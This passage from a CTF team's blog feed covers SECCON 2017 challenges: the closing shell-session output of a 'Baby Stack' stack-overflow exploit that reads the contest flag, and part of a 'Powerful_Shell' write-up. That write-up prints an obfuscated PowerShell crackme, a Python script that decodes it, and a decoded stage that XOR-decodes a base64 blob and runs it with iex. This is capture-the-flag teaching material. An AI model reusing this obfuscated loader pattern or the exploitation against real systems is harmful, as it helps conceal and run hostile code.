<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ python back_stack.py</div><div class="line">[+] Opening connection to baby_stack.pwn.seccon.jp on port 15285: Done</div><div class="line">[*] Switching to interactive mode</div><div class="line">Thank you, !</div><div class="line">msg : </div><div class="line">$ ls</div><div class="line">baby_stack</div><div class="line">flag.txt</div><div class="line">$ id</div><div class="line">uid=30831 gid=30000(baby_stack) groups=30000(baby_stack)</div><div class="line">$ cat flag.txt</div><div class="line">SECCON&#123;<span class="string">'un54f3'</span>m0dul3_15_fr13ndly_70_4774ck3r5&#125;</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Baby Stack&lt;br&gt;&lt;br&gt;Can you do a traditional stack attack?&lt;br&gt;&lt;br&gt;Host : baby_stack.pwn.seccon.jp&lt;br&gt;Port : 15285&lt;br&gt;baby_stac
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="go" scheme="https://teamrocketist.github.io/tags/go/"/>
    
      <category term="statically_linked" scheme="https://teamrocketist.github.io/tags/statically-linked/"/>
    
      <category term="seccon2017" scheme="https://teamrocketist.github.io/tags/seccon2017/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] SECCON - Powerful_Shell</title>
    <link href="https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/"/>
    <id>https://teamrocketist.github.io/2017/12/10/Reverse-SECCON-Powerful-Shell/</id>
    <published>2017-12-10T10:03:07.000Z</published>
    <updated>2017-12-13T17:21:20.460Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Powerful_Shell<br>300 points<br>Powerful_Shell<br><br>Crack me.<br>powerful_shell.ps1-1fb3af91eafdbebf3b3efa3b84fcc10cfca21ab53db15c98797b500c739b0024<br></blockquote>

<p>Windows powershell… We started by analysing the file:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$ECCON</span>=<span class="string">""</span>;</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">3783</span>/<span class="number">291</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">6690</span>/<span class="number">669</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">776</span>-<span class="number">740</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">381</span>-<span class="number">312</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">403</span>-<span class="number">289</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">301</span>+<span class="number">415</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">143</span>-<span class="number">32</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">93594</span>/<span class="number">821</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">626</span>-<span class="number">561</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">86427</span>/<span class="number">873</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">112752</span>/<span class="number">972</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">43680</span>/<span class="number">416</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">95127</span>/<span class="number">857</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">682</span>+<span class="number">792</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">230</span>+<span class="number">310</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](-<span class="number">732</span>+<span class="number">846</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">1027</span>-<span class="number">926</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">94044</span>/<span class="number">922</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">898</span>-<span class="number">797</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">976</span>-<span class="number">862</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">52419</span>/<span class="number">519</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">1430</span>/<span class="number">13</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">18216</span>/<span class="number">184</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">21715</span>/<span class="number">215</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">12320</span>/<span class="number">385</span>);</div><div class="line"><span class="variable">$ECCON</span>+=[char]([int][Math]::sqrt([Math]::pow(<span class="number">61</span>,<span class="number">2</span>)));</div><div class="line">.....</div><div class="line"><span class="built_in">Write-Progress</span> -Activity <span class="string">"Extracting Script"</span> -status <span class="string">"20040"</span> -percentComplete <span class="number">99</span>;</div><div class="line"><span class="variable">$ECCON</span>+=[char](<span class="number">520</span>-<span class="number">510</span>);</div><div class="line"><span class="built_in">Write-Progress</span> -Completed -Activity <span class="string">"Extracting Script"</span>;.([ScriptBlock]::Create(<span class="variable">$ECCON</span>))</div></pre></td></tr></table></figure>
<p>As we can see we have alot of operations, it looks like something is being hidden behind those arithmetic operations, I did a python script to parse all the operation using regex:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</div><div class="line"></div><div class="line">script = <span class="string">''</span></div><div class="line">lines = open(<span class="string">'powerful_shell'</span>,<span class="string">'r'</span>).read().split(<span class="string">'\n'</span>)</div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">	<span class="keyword">if</span> <span class="string">'sqrt'</span> <span class="keyword">in</span> line:</div><div class="line">		op = line.replace(<span class="string">'$ECCON+=[char]([int][Math]::'</span>,<span class="string">''</span>).replace(<span class="string">'[Math]::'</span>,<span class="string">''</span>).replace(<span class="string">';'</span>,<span class="string">''</span>).replace(<span class="string">')'</span>,<span class="string">''</span>) + <span class="string">'))'</span></div><div class="line">		script += chr(int(eval(op)))</div><div class="line">	<span class="keyword">elif</span> <span class="string">'$ECCON'</span> <span class="keyword">in</span> line <span class="keyword">and</span> len(re.findall(<span class="string">r'\((-*[0-9]+.-*[0-9]+)\)'</span>, line)) &gt; <span class="number">0</span>:</div><div class="line">		op = re.findall(<span class="string">r'\((-*[0-9]+.-*[0-9]+)\)'</span>, line)[<span class="number">0</span>]</div><div class="line">		script += chr(int(eval(op)))</div><div class="line"><span class="keyword">print</span> script</div></pre></td></tr></table></figure>
<p>After extracting it we got this:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line">... truncanted ...</div><div class="line"></div><div class="line"><span class="variable">$keytone</span>=@&#123;<span class="string">'a'</span>=<span class="number">261.63</span>&#125;</div><div class="line"><span class="variable">$pk</span>=<span class="string">'a'</span></div><div class="line"><span class="keyword">ForEach</span>(<span class="variable">$k</span> <span class="keyword">in</span> (<span class="string">'w'</span>,<span class="string">'s'</span>,<span class="string">'e'</span>,<span class="string">'d'</span>,<span class="string">'f'</span>,<span class="string">'t'</span>,<span class="string">'g'</span>,<span class="string">'y'</span>,<span class="string">'h'</span>,<span class="string">'u'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>))&#123;</div><div class="line">	<span class="variable">$keytone</span>+=@&#123;<span class="variable">$k</span>=<span class="variable">$keytone</span>[<span class="variable">$pk</span>]*[math]::pow(<span class="number">2</span>,<span class="number">1</span>/<span class="number">12</span>)&#125;;<span class="variable">$pk</span>=<span class="variable">$k</span>	</div><div class="line">&#125;</div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> <span class="string">"Play the secret melody."</span></div><div class="line"></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' w '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' e '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'   |   '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' t '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' y '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">00</span> -f <span class="number">15</span> -n <span class="string">' u '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> <span class="string">'   |    '</span> </div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'    '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  a |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  s |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  d |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  f |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  g |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  h |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'  j |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'  k '</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span> -n <span class="string">'    |'</span></div><div class="line"><span class="built_in">Write-Host</span> -b <span class="number">15</span> -f <span class="number">00</span>  <span class="string">'    '</span></div><div class="line"><span class="built_in">Write-Host</span></div><div class="line"><span class="variable">$stage1</span>=@();<span class="variable">$f</span>=<span class="string">""</span>;</div><div class="line"><span class="keyword">While</span>(<span class="variable">$stage1</span>.length <span class="nomarkup">-lt</span> <span class="number">14</span>)&#123;</div><div class="line">	<span class="variable">$key</span>=(<span class="built_in">Get-Host</span>).ui.RawUI.ReadKey(<span class="string">"NoEcho,IncludeKeyDown"</span>)</div><div class="line">	<span class="variable">$k</span>=[String]<span class="variable">$key</span>.Character</div><div class="line">	<span class="variable">$f</span>+=<span class="variable">$k</span>;</div><div class="line">	<span class="keyword">If</span>(<span class="variable">$keytone</span>.Contains(<span class="variable">$k</span>))&#123;</div><div class="line">		<span class="variable">$stage1</span>+=[math]::floor(<span class="variable">$keytone</span>[<span class="variable">$k</span>])</div><div class="line">		[console]::beep(<span class="variable">$keytone</span>[<span class="variable">$k</span>],<span class="number">500</span>)</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="variable">$secret</span>=@(<span class="number">440</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">523</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">493</span>,<span class="number">440</span>,<span class="number">349</span>)</div><div class="line"><span class="keyword">If</span>(<span class="variable">$secret</span>.length <span class="nomarkup">-eq</span> <span class="variable">$stage1</span>.length)&#123;</div><div class="line">	<span class="keyword">For</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> <span class="nomarkup">-le</span> <span class="variable">$secret</span>.length; <span class="variable">$i</span>++) &#123;</div><div class="line">		<span class="keyword">If</span>(<span class="variable">$secret</span>[<span class="variable">$i</span>] <span class="nomarkup">-ne</span> <span class="variable">$stage1</span>[<span class="variable">$i</span>])&#123;</div><div class="line">			<span class="keyword">Exit</span></div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	x <span class="string">"Correct. Move to the next stage."</span></div><div class="line">&#125;</div><div class="line"><span class="variable">$text</span>=<span class="string">@"</span></div><div class="line"><span class="string">YkwRUxVXQ05DQ1NOE1sVVU4TUxdTThBBFVdDTUwTURVTThMqFldDQUwdUxVRTBNEFVdAQUwRUxtT</span></div><div class="line"><span class="string">TBEzFVdDQU8RUxdTbEwTNxVVQUNOEFEVUUwdQBVXQ0NOE1EWUUwRQRtVQ0FME1EVUU8RThdVTUNM</span></div><div class="line"><span class="string">EVMVUUwRFxdVQUNCE1MXU2JOE0gWV0oxSk1KTEIoExdBSDBOE0MVO0NKTkAoERVDSTFKThNNFUwR</span></div><div class="line"><span class="string">FBVINUFJTkAqExtBSjFKTBEoF08RVRdKO0NKTldKMUwRQBc1QUo7SlNgTBNRFVdJSEZCSkJAKBEV</span></div><div class="line"><span class="string">QUgzSE8RQxdMHTMVSDVDSExCKxEVQ0o9SkwRQxVOE0IWSDVBSkJAKBEVQUgzThBXFTdDRExAKhMV</span></div><div class="line"><span class="string">Q0oxTxEzFzVNSkxVSjNOE0EWN0NITE4oExdBSjFMEUUXNUNTbEwTURVVSExCKxEVQ0o9SkwRQxVO</span></div><div class="line"><span class="string">EzEWSDVBSkJAKBEVQUgzThAxFTdDREwTURVKMUpOECoVThNPFUo3U0pOE0gWThNEFUITQBdDTBFK</span></div><div class="line"><span class="string">F08RQBdMHRQVQUwTSBVOEEIVThNPFUNOE0oXTBFDF0wRQRtDTBFKFU4TQxZOExYVTUwTSBVMEUEX</span></div><div class="line"><span class="string">TxFOF0NCE0oXTBNCFU4QQRVBTB1KFU4TThdMESsXQ04TRBVMEUMVThNXFk4TQRVNTBNIFUwRFBdP</span></div><div class="line"><span class="string">EUEXQ0ITShdME0EVThBXFU4TWxVDThNKF0wRMBdMETUbQ0wRShVOE0MWThMqFU1ME0gVTBFDF08R</span></div><div class="line"><span class="string">QxdMHUMVQUwTSBVOEEEVThNNFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNGF0wTKhVBTxFK</span></div><div class="line"><span class="string">F0wdMxVOEzUXQ04QSBVOE0AVTBFVFUFMEUkXTBFDG0wTQRVMETMXQE4TSBVCE0MXTBNBFU4QQRVB</span></div><div class="line"><span class="string">TB1KFU4TQxdMEVYXTBEUG0NMEUoVThNBFk4TQRVCEygXQ0wRShdPEUMXTB1DFU4TQBdDThBIFU4T</span></div><div class="line"><span class="string">SBVMESgVQUwRSRdMEUYbTBMWFUNOE0gWThNCFUITFBdDTBFKF08RQxdMHUMVThNVF0NOEEgVThNN</span></div><div class="line"><span class="string">FUwRQxVOE0IWQUwRShtME0EVTBFVF08RQxdDQhNKF0wTQRVOEEEVThM9FUNOE0oXTBFFF0wRKBtD</span></div><div class="line"><span class="string">TBFKFU4TQRZOE0EVQhNAF0NMEUoXTxFDF0wdVRVOEzMXQ04QSBVOE00VTBFVFU4TQRZBTBFKG0wT</span></div><div class="line"><span class="string">RBVMESgXQE4TSBVCE0MXTBNBFU4QKhVBTB1KFU4TFBdMEUIXQ04TRBVMEUMVThNBFk4TNxVNTBNI</span></div><div class="line"><span class="string">FUwRQxdPEUMXTB01FUFME0gVThBBFU4TTRVMERQVQUwRSRdMEUMbTBNBFUwRQxdAThNIFUITQxdM</span></div><div class="line"><span class="string">E0EVThAxFUFMHUoVThNDF0wRVhdMEVUbQ0wRShVOE0QWThMWFU1ME0gVTBFDF08RRhdDQhNKF0wT</span></div><div class="line"><span class="string">QRVOEFcVQUwdShVOE0EXTBFFF0NOE0QVTBFDFU4TVxZOEyoVTUwTSBVMETMXTxFVF0NCE0oXTBNE</span></div><div class="line"><span class="string">FU4QQhVBTB1KFU4TQBdMERcXQ04TRBVMEUAVThNDFkFMEUobTBNCFUwRQRdAThNIFUITQRdMExYV</span></div><div class="line"><span class="string">QU8RShdMHUEVThNOF0NOEEgVThNIFUwRKBVBTBFJF0wRMxtMEzcVQ04TSBZOE0EVQhNVF0wTQRVB</span></div><div class="line"><span class="string">TxFKF0wdQxVOE0MXTBFFF0NOE0QVTBFGFU4TKhZBTBFKG0wTRBVMERQXQE4TSBVCE04XTBNXFUFP</span></div><div class="line"><span class="string">EUoXTB0zFU4TThdDThBIFU4TTRVMEUMVThMWFkFMEUobTBNCFUwRFBdAThNIFUITQxdME0EVThAx</span></div><div class="line"><span class="string">FUFMHUoVThNGF0wRQxdDThNEFUwRQRVOEyoWQUwRShtMEzcVTBFDF0BOE0gVQhMzF0wTFhVBTxFK</span></div><div class="line"><span class="string">F0wdMxVOExQXQ04QSBVOE0gVTBEUFUFMEUkXTBEzG0wTQRVDThNIFk4TQRVCEygXTBNEFUFPEUoX</span></div><div class="line"><span class="string">TB1DFU4TRhdDThBIFU4TTRVMEVUVQUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdM</span></div><div class="line"><span class="string">HTMVQUwTSBVOEEEVThNbFUwRNRVBTBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwd</span></div><div class="line"><span class="string">ShVOEzMXTBE2F0NOE0QVTBFBFU4TKhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsV</span></div><div class="line"><span class="string">Q04TShdMEUAXTBFDG0wTQhVDThNIFk4TRBVCEygXQ0wRShdPEUYXTB0UFUFME0gVThBDFU4TTRVD</span></div><div class="line"><span class="string">ThNKF0wRQBdMEUMbTBNBFUNOE0gWThNBFUITQxdME0EVQU8RShdMHUMVThNVF0wRVhdDThNEFUwR</span></div><div class="line"><span class="string">RhVOEyoWQUwRShtME0MVTBEzF0BOE0gVQhNDF0wTQRVOEEEVQUwdShVOExQXTBFNF0NOE0QVTBFG</span></div><div class="line"><span class="string">FU4TRBZBTBFKG0wTRBVMERQXQE4TSBVCEzUXTBMWFUFPEUoXTB1DFU4TRhdDThBIFU4TTRVMEVUV</span></div><div class="line"><span class="string">QUwRSRdMERQbQ0wRShVOE0wWThNDFU1ME0gVTBFDF08RQxdMHTMVQUwTSBVOEEEVThNbFUwRNRVB</span></div><div class="line"><span class="string">TBFJF0wRQxtME0EVTBFAF0BOE0gVQhNDF0wTVxVOEEEVQUwdShVOEzMXTBE2F0NOE0QVTBFBFU4T</span></div><div class="line"><span class="string">KhZBTBFKG0wTQRVMEUMXTxFDF0NCE0oXTBNBFU4QQRVOEzsVQ04TShdMEUAXTBFDG0wTQhVDThNI</span></div><div class="line"><span class="string">Fk4TRBVCEygXQ0wRShdPEUYXTB0zFUFME0gVThBMFU4TSBVDThNKF0wRQxdMERQbQ0wRShVOE0IW</span></div><div class="line"><span class="string">ThNDFU1ME0gVTBFAF08RQRdDQhNKF0wTQxVOEBYVQUwdShVOE0EXTBFNF0NOE0QVTBFDFU4TKhZO</span></div><div class="line"><span class="string">E0QVTUwTSBVMEUYXTxFAF0NCE0oXTBNCFU4QFhVBTB1KFU4TQBdMEUIXQ04TRBVMEUAVThNDFkFM</span></div><div class="line"><span class="string">EUobTBNDFUwRFBdAThNIFUITQRdME0wVQU8RShdMHUMVThMoF0wRNhdDThNEFUwRRhVOEzEWQUwR</span></div><div class="line"><span class="string">ShtME0EVTBFGF0BOE0gVQhNDF0wTVxVBTxFKF0wdQxVOEygXTBE2FxROE10VShZOTBFTF2E=</span></div><div class="line"><span class="string">"@</span></div><div class="line"></div><div class="line"><span class="variable">$plain</span>=@()</div><div class="line"><span class="variable">$byteString</span> = [System.Convert]::FromBase64String(<span class="variable">$text</span>)</div><div class="line"><span class="variable">$xordData</span> = $(<span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> <span class="nomarkup">-lt</span> <span class="variable">$byteString</span>.length; ) &#123;</div><div class="line">	<span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> <span class="nomarkup">-lt</span> <span class="variable">$f</span>.length; <span class="variable">$j</span>++) &#123;</div><div class="line">		<span class="variable">$plain</span>+=<span class="variable">$byteString</span>[<span class="variable">$i</span>] -bxor <span class="variable">$f</span>[<span class="variable">$j</span>]</div><div class="line">		<span class="variable">$i</span>++</div><div class="line">		<span class="keyword">if</span> (<span class="variable">$i</span> <span class="nomarkup">-ge</span> <span class="variable">$byteString</span>.Length) &#123;</div><div class="line">			<span class="variable">$j</span> = <span class="variable">$f</span>.length</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;)</div><div class="line">iex([System.Text.Encoding]::ASCII.GetString(<span class="variable">$plain</span>))</div></pre></td></tr></table></figure>
<p>I removed some of the beginning of the script, it was useless code and was just printing some things to the screen, continuing with the rest we have more two steps to conclude, the first one was to play the piano accordantly to the key in the code <code>440,440,493,440,440,493,440,493,523,493,440,493,440,349</code>.</p>
